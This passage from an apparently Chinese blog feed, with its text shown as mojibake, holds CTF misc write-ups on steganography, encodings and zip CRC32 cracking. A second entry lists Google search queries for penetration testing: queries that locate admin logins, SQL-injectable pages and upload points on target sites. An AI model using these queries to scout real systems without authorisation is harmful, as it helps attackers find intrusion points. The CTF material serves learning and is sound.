title="misc2"></a>misc2</h2><p>hintï¼šå¶ç„¶å‘ç°æˆ‘ç«Ÿç„¶è¿˜æœ‰ä¸ªè½¯ç›˜ï¼Œå‹¾èµ·äº†æˆ‘çš„å›å¿†ã€‚</p><p>ä¸‹è½½å¾—åˆ°fileæ–‡ä»¶ï¼ˆæ²¡æœ‰åç¼€ï¼‰ï¼Œå¯ä»¥é€šè¿‡file fileå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶ç±»å‹</p><pre><code>file: DOS/MBR boot sector, code offset 0x4e+2, OEM-ID &quot;CTF.SHOW&quot;, root entries 224, sectors 2880 (volumes &lt;=32 MB), sectors/FAT 9, sectors/track 18, sectors 2880 (volumes &gt; 32 MB), serial number 0xffffffff, label: &quot;flagnothere&quot;, FAT (12 bit by descriptor+sectors), followed by FAT</code></pre><p>dosï¼šç£ç›˜æ“ä½œç³»ç»Ÿ</p><p>1.44MBè½¯ç›˜ä½¿ç”¨çš„FATæ–‡ä»¶ç³»ç»Ÿé€šå¸¸ä¸ºFAT12ï¼Œæ ¹æ®<a href="https://zhuanlan.zhihu.com/p/121807427" target="_blank" rel="noopener">FAT12çš„MBRå¼•å¯¼è®°å½•ç»“æ„</a>ï¼Œç¬¬54å­—èŠ‚å¼€å§‹çš„8ä½åº”å›ºå®šä¸ºFAT12ã€‚è€Œè¯¥æ–‡ä»¶ä¸­è¢«ä¿®æ”¹æˆäº†FAT11ï¼Œéœ€è¦è¿›è¡Œä¿®å¤ã€‚<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8808%E6%97%A51923_1.png" alt></p><p>11æ”¹ä¸º12ï¼Œ31æ”¹ä¸º32ï¼Œç„¶åæ–°å»ºè™šæ‹Ÿæœºï¼Œè½½å…¥fileè½¯ç›˜é•œåƒæ–‡ä»¶ï¼Œå¯åŠ¨è™šæ‹Ÿæœºå°±ä¼šå¾—åˆ°ï¼šflag{ctfshow}</p><h2 id="miscx"><a href="#miscx" class="headerlink" title="miscx"></a>miscx</h2><p>å¾—åˆ°åŠ å¯†å‹ç¼©åŒ…ï¼Œå…¶ä¸­æœ‰æ³¨é‡Šï¼š1.2020å¿«ä¹ï¼2.ratï¼Ÿorï¼Ÿè¿˜æœ‰æœªåŠ å¯†æ–‡ä»¶misc.pngï¼Œç”¨hxdæ‰“å¼€åœ¨å­—ç¬¦ä¸²æœ€åå¾—åˆ°flag{flag_1s_n0t_h3r3}ä½†æ˜¯ä¸æ˜¯misc1çš„å¯†ç ï¼Œå¯†ç å…¶å®æ˜¯å›¾ç‰‡æœ¬èº«ï¼š2020ï¼å¾—åˆ°</p><pre><code>â™­â€–â™­â€–â€–â™¯â™­â™­â™¬â€–â™©â™«â€–â™¬âˆ®â™­â™­Â¶â™­â€–â™¯â€–Â¶â™­â™­â€–âˆ®â€–â€–â™­â€–Â§â™­â€–â™¬â™ªâ™­â™¯Â§â€–â€–â™¯â€–â€–â™¬â€–â€–â™ªâ€–â€–â™ªâ€–Â¶Â§â€–â€–â™¬â™­â™¯â€–â™­â™¯â™ªâ€–â€–âˆ®â€–â™¬Â§â™­â€–â€–â€–â™©â™ªâ€–â€–â™¬â™­â™­â™¬â€–â™©â™ªâ€–â™©Â¶â€–â™©â™ªâ€–â™©â™¬â€–Â¶Â§â€–â€–â™©â€–Â¶â™«â™­â™­â™©â€–â™¬â™¯â€–â™¬Â§â™­â€–â™­â€–â™©Â¶â€–â€–âˆ®â™­â™­â™¬â€–â€–â™­â€–â™«Â§â€–Â¶â™«â€–â™©âˆ®â™­â™­Â§â€–â™­Â§â€–â™­Â§Â§=</code></pre><p>æ ¹æ®ç‰¹å¾åˆ¤æ–­å‡ºæ˜¯éŸ³ä¹ç¬¦å·åŠ å¯†ä½¿ç”¨<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" target="_blank" rel="noopener">è¿™ä¸ªåœ¨çº¿åŠ å¯†å·¥å…·</a>åŠ å¯†çš„ï¼Œè§£å¯†å¾—åˆ°ï¼š</p><pre><code>U2FsdGVkX1/eK2855m8HM4cTq8Fquqtm6QDbcUu4F1yQpA==</code></pre><p>base64å†è§£ç ï¼šä¹±ç ï¼Œæ— æ³•è§£ç </p><p>æç¤º2ï¼šratï¼Ÿorï¼Ÿ</p><p>rabbitå†è§£å¯†ï¼ˆkey=2020ï¼‰ï¼š</p><pre><code>welcome_to_payhelp</code></pre><p>ï¼ˆè¿™ä¸ªpayhelpæ˜¯ä¸€ä¸ªå•èº«äº¤å‹å¹³å°ï¼‰</p><p>okå¼€å§‹è¿›æ”»misc2hintå¯†ç å°±æ˜¯ä¸Šé¢å¾—åˆ°çš„ï¼Œè§£å¼€å¾—(base64è§£å¯†å)ï¼š</p><pre><code>welcome_to_2020%0Aflag%20is%20coming...%0Athe%20key%20is%20hello%202020%217</code></pre><p>URLè§£ç å¾—ï¼š</p><pre><code>welcome_to_2020flag is coming...the key is hello 2020!</code></pre><p>flag{g00d_f0r_y0u}</p><h2 id="misc50"><a href="#misc50" class="headerlink" title="misc50"></a>misc50</h2><p>pngæ–‡ä»¶3.05mbï¼Œhxdæ‰“å¼€åœ¨å­—ç¬¦ä¸²æœ«å°¾å¾—åˆ°</p><pre><code>Sk5DVlM2Mk1NRjVIU1gyTk1GWEgyQ1E9Cg==</code></pre><p>base64å¤„ç†ï¼š</p><pre><code>JNCVS62MMF5HSX2NMFXH2CQ=</code></pre><p>base32å¤„ç†ï¼š</p><pre><code>KEY{Lazy_Man}</code></pre><p>ç„¶åç›´æ¥åç¼€æ”¹ä¸ºzipï¼Œå¾—åˆ°fbi.raræ‰“å¼€å¾—åˆ°flag.zipå’Œæ³¨é‡ŠGEZDGNBVGYFA====</p><p>base32å¤„ç†å¾—åˆ°ï¼š123456</p><p>è¾“å…¥å¯†ç 123456å¾—åˆ°æ–‡æœ¬æ–‡ä»¶ï¼šthienc.txt|æ‰“å¼€å¾—åˆ°10.3Mçš„æ•°å­—ï¼Œä¸”3078é‡å¤å‡ºç°ï¼Œ3078è¿›è¡Œ16è¿›åˆ¶è§£ç åå¾—åˆ°0xä¹Ÿå°±æ˜¯è¯´éƒ½æ˜¯16è¿›åˆ¶ç¼–ç ï¼Œäºæ˜¯éœ€è¦ï¼šæ‰¹é‡åˆ é™¤0xï¼Œå°†å‰©ä¸‹çš„è½¬æ¢ä¸º16è¿›åˆ¶ï¼Œåˆå› ä¸º3337==&gt;37,3761==&gt;7a</p><pre><code> {&quot;æ‰©å±•å&quot;:&quot;7z&quot;,&quot;æ–‡ä»¶å¤´æ ‡è¯†ï¼ˆHEXï¼‰&quot;:&quot;377ABCAF271C&quot;,&quot;æ–‡ä»¶æè¿°&quot;:&quot;7-ZIPcompressedfile&quot;}</code></pre><p><a href="https://zhuanlan.zhihu.com/p/158980459" target="_blank" rel="noopener">ç‚¹å‡»æ­¤å¤„æŸ¥çœ‹æ›´å¤š</a>æ–‡ä»¶å¤´</p><p>ä¹Ÿå°±æ˜¯è¯´æœ€åè¦å˜ä¸º7zçš„å‹ç¼©åŒ…ï¼Œå¤§ä½¬è„šæœ¬ï¼ˆæ­¤è„šæœ¬å¯ä¸€æ­¥åˆ°ä½å¾—åˆ°çš„test.txtä»¥16è¿›åˆ¶æ–‡æœ¬çš„å½¢å¼ç²˜è´´åˆ°010ç„¶åä¿å­˜æ ¼å¼ä¸ºï¼‰ï¼š</p><pre><code>import redef read_file(filepath):    with open(filepath) as fp:        content=fp.read();    return contentnumber = read_file(&#39;1.txt&#39;)result = []result.append(re.findall(r&#39;.{2}&#39;, number))result = result[0]strings =&#39;&#39;for i in result:    y = bytearray.fromhex(i)    z = str(y)    z= re.findall(&quot;b&#39;(.*?)&#39;&quot;,z)[0]    strings += zb= strings.split(&#39;0x&#39;)strings=&#39;&#39;for i in b:    if len(i) ==1:        i= &#39;0&#39; + i    strings +=iwith open(&#39;test.txt&#39;, &#39;w&#39;) as f:    f.write(strings)</code></pre><p>å¾—å¸¦çš„7zå‹ç¼©åŒ…è§£å‹å¯†ç ï¼šKEY{Lazy_Man}</p><p>ç”¨base3ä»¶å¥—è„šæœ¬è·‘å¤±è´¥ã€‚</p><p>è½¬ç”¨è„šæœ¬é’ˆå¯¹32å’Œ64çš„å¾ªç¯è§£ç è„šæœ¬ï¼ˆå‘ï¼šè„šæœ¬åå­—ä¸å¯ä»¥å’Œä½ è¦å¯¼å…¥çš„æ¨¡æ¿é‡åï¼Œå¦åˆ™ä¼šå¯¼å…¥å¤±è´¥ï¼‰</p><p>è¿™é‡Œç”¨base64å’Œ32ä»¶å¥—çš„è„šæœ¬åŸå› æ˜¯é’ˆå¯¹å¼€å¤´éƒ¨åˆ†åŠ å¯†å­—ç¬¦ä¸²è¿›è¡Œè§£å¯†ç„¶ååˆ¤æ–­ï¼Œä»¥ä¸‹æ˜¯è„šæœ¬ï¼ˆäº²æµ‹å¯è¡Œï¼‰ï¼š</p><pre><code>import base64import ref = open(&#39;C:/Users/Administrator/Desktop/secenc.txt&#39;).read().encode(&#39;utf-8&#39;)while True:    if re.match(&#39;^[2-7A-Z=]+$&#39;, f.decode(&#39;utf-8&#39;)):        f = base64.b32decode(f)    elif re.match(&#39;^[0-9a-zA-Z+/=]+$&#39;, f.decode(&#39;utf-8&#39;)):        f = base64.b64decode(f)    else:        print(f.decode(&#39;utf-8&#39;))        break</code></pre><p>å¾—åˆ°ä»¥ï¼.ï¼Ÿç»„æˆçš„åŠ å¯†æ–‡ä»¶ï¼Œæ˜¯ç®€åŒ–å½¢å¼çš„Ook!ï¼Œåœ¨çº¿å·¥å…·è¿è¡Œå¾—åˆ°ï¼ˆæ— åˆ å‡ï¼‰ï¼š</p><pre><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;.&lt; +++[- &gt;+++&lt; ]&gt;+++ ++.+++++++ .---- ----- .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--. &lt;++++ +++[- &gt;++++ +++&lt;]&gt;++++ +++++ +++.- ----- --.-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; +++++ .&lt;+++ +++[-&gt;---- --&lt;]&gt; -.&lt;++ ++[-&gt; ++++&lt; ]&gt;.++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.&lt;+ +++[-&gt;++++ &lt;]&gt;++ .---- ---.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- -.&lt;++ +++++ [-&gt;+++++++ &lt;]&gt;++ ++.++ +++++ .++++ ++++. &lt;++++ +++++ [-&gt;-- ----- --&lt;]&gt; -----.&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;++++ +++++ ++.&lt;</code></pre><p>brainfuckè§£ç ï¼šflag{Welc0me_tO_cTf_3how!}</p><p>é¢˜å¤–è¯ï¼šä¸å¾—ä¸è¯´ï¼Œctfshowçš„miscæ¯”buuctfæœ‰æå¤´</p><h1 id="2021-02-09"><a href="#2021-02-09" class="headerlink" title="2021-02-09"></a>2021-02-09</h1><h2 id="misc30"><a href="#misc30" class="headerlink" title="misc30"></a>misc30</h2><p>rarå‹ç¼©åŒ…å†…ä¸‰ä¸ªæ–‡ä»¶</p><p>å…ˆä»æœªåŠ å¯†çš„æ˜Ÿç©ºjpgå¼€å§‹ï¼Œå³é”®å±æ€§ï¼Œè¯¦ç»†ä¿¡æ¯å¾—åˆ°ï¼š</p><pre><code>little stars</code></pre><p>è§£å¼€çœ¼è§ä¸ä¸€å®šä¸ºå®.docçš„å¯†ç ï¼Œé‡Œé¢æ˜¯wordéšå†™ï¼Œå…¨é€‰åæ”¹å˜é¢œè‰²å­—ä½“å¾—åˆ°ï¼š</p><pre><code>ä½ çŸ¥é“æ¢µé«˜çš„æ˜Ÿç©ºå—ï¼ŸHello friend!</code></pre><p>åˆ©ç”¨å…¶è§£å¼€flag.pngå¾—åˆ°äºŒç»´ç åˆ©ç”¨è½¯ä»¶cqrå¾—åˆ°flag{welcome_to_ctfshow}</p><h2 id="stega1"><a href="#stega1" class="headerlink" title="stega1"></a>stega1</h2><p>é¢˜å¦‚å…¶åstegoéšå†™ï¼ˆfailedï¼‰</p><p>winhexï¼ˆfailedï¼‰</p><p>jphsä¸­çš„seek(success)ï¼šå¯†ç ä¸ºç©ºï¼Œä¿å­˜æ–‡ä»¶ä¸ºtxt</p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p><strong>å¯†æ–‡ï¼šzse4rfvsdf 6yjmko0</strong></p><p><strong>æç¤º1ï¼šè§£å¯†åä¸¤ä¸ªå­—ç¬¦,å°å†™ æç¤º2ï¼šçœ‹çœ‹è‡ªå·±ä¸‹é¢</strong></p><p><strong>æäº¤flag{æ˜æ–‡}</strong></p><p>é”®ç›˜å¯†ç ï¼šav</p><h2 id="misc40"><a href="#misc40" class="headerlink" title="misc40"></a>misc40</h2><p>åŠ å¯†æ–‡ä»¶ï¼šsvega.wav</p><p>æœªåŠ å¯†æ–‡ä»¶ï¼šsvega.mp3ï¼Œconversion.txtï¼Œä¸€å¼ æ™®é€šçš„äºŒç»´ç .png</p><p>conversion.txtåˆ©ç”¨è¿‡ç¨‹ï¼š</p><p>æ–‡æœ¬å†…å®¹ï¼š</p><pre><code>1100010101000111012&gt;4&gt;8&gt;10</code></pre><p>çœ‹æœ€åä¸€è¡Œåº”è¯¥æ˜¯2è¿›åˆ¶è½¬4è½¬8è½¬10ï¼Œ2ç›´æ¥è½¬10å°±è¡Œå¾—åˆ°ç»“æœï¼š202013ï¼Œä½¿mp3å¯ä»¥è§£ç </p><p>äºŒç»´ç åˆ©ç”¨è¿‡ç¨‹ï¼š</p><p>winhexæ‰“å¼€å¾—åˆ°brainfuckåŠ å¯†ï¼Œè§£ç å¾—ï¼š</p><p>å’Œè°æ°‘ä¸»å’Œè°æ–‡æ˜å’Œè°å’Œè°å’Œè°è‡ªç”±å’Œè°å¹³ç­‰å’Œè°å…¬æ­£</p><p>å†è§£ç å¾—ï¼š123456ï¼Œä½†æ˜¯æ²¡ç”¨ä¸Šã€‚</p><p>MP3åˆ©ç”¨è¿‡ç¨‹ï¼š</p><p>è€ƒè™‘å¾—åˆ°çš„mp3ï¼Œä½¿ç”¨mp3stegoåå¾—åˆ°æ–‡ä»¶ï¼šsvega.mp3.pcm</p><pre><code>é€‰é¡¹:-X æå–éšè—æ•°æ®-P&lt;text&gt; ç”¨äºåµŒå…¥çš„å¯†ç çŸ­è¯­-A å†™ä¸€ä¸ªAIFFè¾“å‡ºçš„è„‰ç è°ƒåˆ¶å£°éŸ³æ–‡ä»¶-s &lt;sb &gt; ä»…é€‚ç”¨äºæ­¤sb(ä»…è°ƒè¯•)inputBS è¾“å…¥ç¼–ç éŸ³é¢‘çš„è¾“å…¥æ¯”ç‰¹æµoutPCM è¾“å‡ºPCMè¾“å‡ºPCMå£°éŸ³æ–‡ä»¶(dflt inputBS+.aif|.pcm)outhidden è¾“å‡ºéšè—æ–‡æœ¬æ–‡ä»¶(dflt inputBS+.txt)</code></pre><p>è¿™é‡Œéœ€è¦-P 123456ä¸ç„¶åªä¼šå¾—åˆ°svega.mp3.pcmï¼š</p><pre><code>hintï¼šé™é»˜ä¹‹çœ¼å¯¹äº†~å¦ä¸€ä¸ªéŸ³ä¹çš„å¯†ç æ˜¯abc123å“¦ä½ é©¬ä¸Šå°±æˆåŠŸäº†ï¼</code></pre><p>å’±ä¹Ÿä¸çŸ¥é“é™é»˜ä¹‹çœ¼æ˜¯ä»€ä¹ˆä¸œè¥¿ã€‚ã€‚ã€‚åŸæ¥å«sileneyeéšå†™å·¥å…·ï¼Œæ ¹æ®è¿›åˆ¶è½¬æ¢å¾—åˆ°çš„å¯†ç 202013è§£å¯†wavæ–‡ä»¶ï¼šflag{C0ngr4tul4ti0n!}</p><h1 id="2021-02-10"><a href="#2021-02-10" class="headerlink" title="2021-02-10"></a>2021-02-10</h1><h2 id="misc30-1"><a href="#misc30-1" class="headerlink" title="misc30"></a>misc30</h2><p>å¾—åˆ°aihe.mp3ï¼Œmp3stegoå°è¯•ï¼ˆå‡‰ï¼‰ï¼Œforemostè·‘ä¸€äº›å¾—åˆ°å›¾ç‰‡ï¼Œä¿®æ”¹é«˜åº¦ï¼Œå¾—åˆ°çŒªåœˆå¯†ç ï¼Œè§£å¯†å¾—ï¼šwell done</p><p>flag{well done}</p><h2 id="çº¢åŒ…é¢˜ç¬¬ä¸€å¼¹"><a href="#çº¢åŒ…é¢˜ç¬¬ä¸€å¼¹" class="headerlink" title="çº¢åŒ…é¢˜ç¬¬ä¸€å¼¹"></a>çº¢åŒ…é¢˜ç¬¬ä¸€å¼¹</h2><p>æ‰“å¼€å¾—åˆ°86ä¸ªzipæ–‡ä»¶ï¼Œç›´æ¥86ä¸ªå›¾ç‰‡ï¼Œå°è¯•è§£å‹å‡ å¼ å›¾ç‰‡ï¼Œå¹¶ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æŸ¥çœ‹ï¼Œå‘ç°æœ«å°¾å‡æœ‰é¢å¤–æ•°æ®ï¼ŒåŸºæœ¬å°±æ˜¯base64ã€‚</p><p>è„šæœ¬ä»‹ç»ï¼šæŒ‰æ–‡ä»¶åé¡ºåºä¾æ¬¡å°†å‹ç¼©åŒ…è§£å‹å¾—åˆ°å›¾ç‰‡ï¼Œå¹¶æå–å›¾ç‰‡æœ«å°¾çš„å­—ç¬¦ä¸²åæ‹¼æ¥ï¼š</p><pre><code>import zipfilepath1 = &#39;C:/Users/Administrator/Desktop/flag/&#39;path2 = &#39;C:/Users/Administrator/Desktop/flag/out/&#39;res = &#39;&#39;for i in range(1, 87):    zip = zipfile.ZipFile(path1 + str(i) + &#39;.zip&#39;)    jpg = str(i) + &#39;.jpg&#39;    zip.extract(jpg, path2)    zip.close()    f = open(path2 + jpg, &#39;rb&#39;).read()    res += f[len(f)-100:len(f)+1].decode(&#39;utf-8&#39;)print(res)</code></pre><p><strong>å…³äºbase64ç¼–ç çš„å›¾ç‰‡base64çš„å¼€å¤´ä¸ºiVBORâ€¦</strong>æ­¤å¤„å°±æ˜¯ï¼Œæ‰€ä»¥æ–‡ä»¶å¤´å°±åŠ ä¸Š<strong>data:image/png;base64,</strong>ç„¶åbase64è½¬å›¾ç‰‡å¾—åˆ°äºŒç»´ç å¾—ï¼šflag{gif_is_so_easy}</p><h2 id="stega10"><a href="#stega10" class="headerlink" title="stega10"></a>stega10</h2><p>å¾—åˆ°æ–‡ä»¶heart.jpgï¼Œwinhexæˆ–è€…ç”¨å‘½ä»¤strings heart.jpgå¾—ï¼šaHR0cHM6Ly93d3cubGFuem91cy5jb20vaTliMGtzZA</p><p>base64è§£ç å¤„ç†ï¼š</p><p><a href="https://www.lanzous.com/i9b0ksd" target="_blank" rel="noopener">https://www.lanzous.com/i9b0ksd</a></p><p>ä¸‹è½½å¾—åˆ°å‹ç¼©åŒ…ï¼Œå…¶ä¸­å¯†ç æ–‡ä»¶å¤¹å†…åŒ…å«9ä¸ª1å­—èŠ‚é•¿çš„txtæ–‡ä»¶ï¼Œé€šè¿‡CRC32çˆ†ç ´çš„æ–¹æ³•å¾—åˆ°9ä¸ªtxtæ–‡ä»¶çš„å†…å®¹ï¼š</p><pre><code>import zipfileimport stringimport binasciicrc = []zip = zipfile.ZipFile(&#39;C:/Users/Administrator/Desktop/flag.zip&#39;, &#39;r&#39;)for i in zip.namelist():    crc += [zip.getinfo(i).CRC]crc = crc[1:10]for i in range(9):    for j in string.printable:        c = binascii.crc32(j.encode(&#39;utf-8&#39;))        if c == crc[i]:            print(j, end = &#39;&#39;)</code></pre><p>å¾—åˆ°ï¼š447^*5#)7</p><p>ä½œä¸ºå¯†ç è¾“å…¥å¾—åˆ°n.pngï¼Œwinhexæ‰“å¼€ï¼Œå‘ç°æ–‡ä»¶è¢«å€’ç€å†™äº†ï¼Œè„šæœ¬ï¼š</p><pre><code>f = open(&#39;C:/Users/Administrator/Desktop/n.png&#39;, &#39;rb&#39;).read()res = open(&#39;C:/Users/Administrator/Desktop/n2.png&#39;, &#39;wb&#39;)res.write(f[::-1])</code></pre><p>å¾—åˆ°äºŒç»´ç æ‰«ç å¾—åˆ°ï¼šflag{æˆ‘å¥½éš¾å•Š}</p><h2 id="stega11"><a href="#stega11" class="headerlink" title="stega11"></a>stega11</h2><p>å¸¸è§„çŸ¥è¯†æ™®åŠä¸€ä¸‹<br>jpgçš„æ–‡ä»¶å¤´ï¼ŒFF D8<br>jpgçš„æ–‡ä»¶å°¾, FF D9</p><p>æˆ‘ä»¬æœç´¢FF D9ï¼Œåœ¨ç¬¬ä¸€ä¸ªç»“æœåï¼Œå‘ç°base32å¯†æ–‡ï¼š</p><pre><code>MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2</code></pre><p>base32è§£ç å¾—ï¼š</p><p>flag{6f1797d4080b29b64da5897780463e30}</p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> CTFshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœç´¢è¯­æ³•</title>
      <link href="/2021/01/18/sou-suo-yu-fa/"/>
      <url>/2021/01/18/sou-suo-yu-fa/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1808492017&auto=1&height=66"></iframe><h1 id="ä¸€ã€è°·æ­Œè¯­æ³•æ˜¯ä»€ä¹ˆ"><a href="#ä¸€ã€è°·æ­Œè¯­æ³•æ˜¯ä»€ä¹ˆ" class="headerlink" title="ä¸€ã€è°·æ­Œè¯­æ³•æ˜¯ä»€ä¹ˆ"></a>ä¸€ã€è°·æ­Œè¯­æ³•æ˜¯ä»€ä¹ˆ</h1><p>è°·æ­Œè¯­æ³•å°±æ˜¯åˆ©ç”¨æœç´¢å¼•æ“åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹æœç´¢åˆ°ç‰¹å®šé¡µé¢çš„ä¸€ç§è¯­æ³•</p><h1 id="äºŒã€å¦‚ä½•åˆ©ç”¨è°·æ­Œè¯­æ³•"><a href="#äºŒã€å¦‚ä½•åˆ©ç”¨è°·æ­Œè¯­æ³•" class="headerlink" title="äºŒã€å¦‚ä½•åˆ©ç”¨è°·æ­Œè¯­æ³•"></a>äºŒã€å¦‚ä½•åˆ©ç”¨è°·æ­Œè¯­æ³•</h1><h2 id="è°·æ­Œè¯­æ³•åŸºç¡€çš„ç¬¦å·ï¼š"><a href="#è°·æ­Œè¯­æ³•åŸºç¡€çš„ç¬¦å·ï¼š" class="headerlink" title="è°·æ­Œè¯­æ³•åŸºç¡€çš„ç¬¦å·ï¼š"></a>è°·æ­Œè¯­æ³•åŸºç¡€çš„ç¬¦å·ï¼š</h2><p><strong>â€œxxxâ€: å°†è¦æœç´¢çš„å…³é”®å­—ç”¨å¼•å·æ‹¬èµ·æ¥  (è¡¨ç¤ºå®Œå…¨åŒ¹é…ï¼Œå³å…³é”®è¯ä¸èƒ½åˆ†å¼€ï¼Œé¡ºåºä¹Ÿä¸èƒ½å˜)</strong></p><p>ä¾‹å¦‚ï¼šè…¾è®¯è¯¾å ‚å¦‚æœä¸åŠ â€œ â€çš„è¯ï¼Œå°±ä¼šé’ˆå¯¹è…¾è®¯å’Œè¯¾å ‚è¿›è¡Œæ‹†åˆ†ï¼Œæ—¢å¯¹è…¾è®¯è¿›è¡Œæœç´¢ä¹Ÿå¯¹è¯¾å ‚è¿›è¡Œæœç´¢ï¼Œæ‰€ä»¥åŠ ä¸Šâ€œ â€çš„è¯å°±ä¼šå¯¹è…¾è®¯è¯¾å ‚è¿›è¡Œç»‘å®šï¼Œåªå¯¹è…¾è®¯è¯¾å ‚è¿›è¡Œæœç´¢</p><p><strong>+ï¼šâ€œxxxâ€ +baidu.com</strong> </p><p>  <strong>æœç´¢xxxä¸baidu.com ç›¸å…³çš„å†…å®¹</strong></p><p>ä¾‹å¦‚ï¼šè…¾è®¯è¯¾å ‚ +ke.qq.comï¼Œé‚£ä¹ˆè¿™é‡Œå°±ä¼šæ˜¾ç¤ºke.qq.comç›¸å…³çš„å†…å®¹</p><p><strong>-ï¼šâ€œxxxâ€ -baidu.com</strong> </p><p>  <strong>æœç´¢ç»“æœé‡Œé¢é™¤å»baidu.com ç›¸å…³çš„å†…å®¹</strong></p><p>ä¾‹å¦‚ï¼šè…¾è®¯è¯¾å ‚ -ke.qq.comï¼Œè¿™é‡Œå†æœç´¢çš„æ—¶å€™ï¼Œå°±ä¼šæŠŠè¿™ä¸ªç½‘å€å±è”½æ‰</p><h2 id="è°·æ­Œè¯­æ³•çš„åŸºç¡€ä½¿ç”¨"><a href="#è°·æ­Œè¯­æ³•çš„åŸºç¡€ä½¿ç”¨" class="headerlink" title="è°·æ­Œè¯­æ³•çš„åŸºç¡€ä½¿ç”¨"></a>è°·æ­Œè¯­æ³•çš„åŸºç¡€ä½¿ç”¨</h2><p>åœ¨æ¸—é€æµ‹è¯•çš„è¿‡ç¨‹ä¸­ï¼Œè¿ç”¨è°·æ­Œè¯­æ³•èƒ½å¿«é€Ÿåœ°å¸®æˆ‘ä»¬æ‰¾åˆ°å¯èƒ½å­˜åœ¨æ¼æ´çš„é¡µé¢</p><h3 id="è°·æ­Œè¯­æ³•å¸¸ç”¨æœç´¢å‚æ•°ï¼š"><a href="#è°·æ­Œè¯­æ³•å¸¸ç”¨æœç´¢å‚æ•°ï¼š" class="headerlink" title="è°·æ­Œè¯­æ³•å¸¸ç”¨æœç´¢å‚æ•°ï¼š"></a>è°·æ­Œè¯­æ³•å¸¸ç”¨æœç´¢å‚æ•°ï¼š</h3><h4 id="siteï¼š"><a href="#siteï¼š" class="headerlink" title="siteï¼š"></a>siteï¼š</h4><p>æŒ‡å®šåŸŸåï¼Œå¦‚ï¼šsite:edu.cn æœç´¢æ•™è‚²ç½‘ç«™</p><h4 id="inurlï¼š"><a href="#inurlï¼š" class="headerlink" title="inurlï¼š"></a>inurlï¼š</h4><p>ç”¨äºæœç´¢åŒ…å«çš„urlå…³é”®è¯çš„ç½‘é¡µï¼Œå¦‚ï¼šinurl:uploads æ–‡ä»¶ä¸Šä¼ ï¼Œæœç´¢å…³äºå…¬å¸æœ‰å…³çš„ç½‘å€ä¸­å«æœ‰loginçš„ç½‘é¡µï¼Œ</p><h4 id="intitleï¼š"><a href="#intitleï¼š" class="headerlink" title="intitleï¼š"></a>intitleï¼š</h4><p>æœç´¢ç½‘é¡µæ ‡é¢˜ä¸­çš„å…³é”®å­—ï¼Œå¦‚ï¼š</p><p>intitle:â€index of /adminâ€ robots.txt </p><p>intitle:â€robots.txtâ€</p><h4 id="intextï¼š"><a href="#intextï¼š" class="headerlink" title="intextï¼š"></a>intextï¼š</h4><p>æœç´¢ç½‘é¡µæ­£æ–‡ä¸­çš„å…³é”®å­—ï¼Œå¦‚ï¼šintext:ç™»é™†/æ³¨å†Œ/ç”¨æˆ·å/å¯†ç </p><h4 id="filetypeï¼š"><a href="#filetypeï¼š" class="headerlink" title="filetypeï¼š"></a>filetypeï¼š</h4><p>æŒ‰æŒ‡å®šæ–‡ä»¶ç±»å‹å³æ–‡ä»¶åç¼€åæœç´¢ï¼Œå¦‚ï¼šfiletpye:php/asp/jsp</p><h4 id="cacheï¼š"><a href="#cacheï¼š" class="headerlink" title="cacheï¼š"></a>cacheï¼š</h4><p>å·²ç»åˆ é™¤çš„ç¼“å­˜ç½‘é¡µï¼Œæ¨èç»„åˆä½¿ç”¨</p><h2 id="è°·æ­Œè¯­æ³•æ‹“å±•"><a href="#è°·æ­Œè¯­æ³•æ‹“å±•" class="headerlink" title="è°·æ­Œè¯­æ³•æ‹“å±•"></a>è°·æ­Œè¯­æ³•æ‹“å±•</h2><h3 id="æŸ¥æ‰¾åå°"><a href="#æŸ¥æ‰¾åå°" class="headerlink" title="æŸ¥æ‰¾åå°"></a>æŸ¥æ‰¾åå°</h3><p>site:xx.com intext:ç®¡ç†|åå°|ç™»é™†|ç”¨æˆ·å|å¯†ç |ç³»ç»Ÿ|å¸å·|admin|login|sys|managetem|password|username </p><p>site:xx.com inurl:login|admin|manage|member|admin_login|login_admin|system|login|user</p><h3 id="æŸ¥æ‰¾sqlæ³¨å…¥æ¼æ´"><a href="#æŸ¥æ‰¾sqlæ³¨å…¥æ¼æ´" class="headerlink" title="æŸ¥æ‰¾sqlæ³¨å…¥æ¼æ´"></a>æŸ¥æ‰¾sqlæ³¨å…¥æ¼æ´</h3><p>inurl:.php?id=23 å…¬å¸</p><p>inurl:.asp?id=11</p><h3 id="æŸ¥æ‰¾ä¸Šä¼ ç‚¹ï¼š"><a href="#æŸ¥æ‰¾ä¸Šä¼ ç‚¹ï¼š" class="headerlink" title="æŸ¥æ‰¾ä¸Šä¼ ç‚¹ï¼š"></a>æŸ¥æ‰¾ä¸Šä¼ ç‚¹ï¼š</h3><p>site:xx.com inurl:file| uploadfile</p><h3 id="æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a 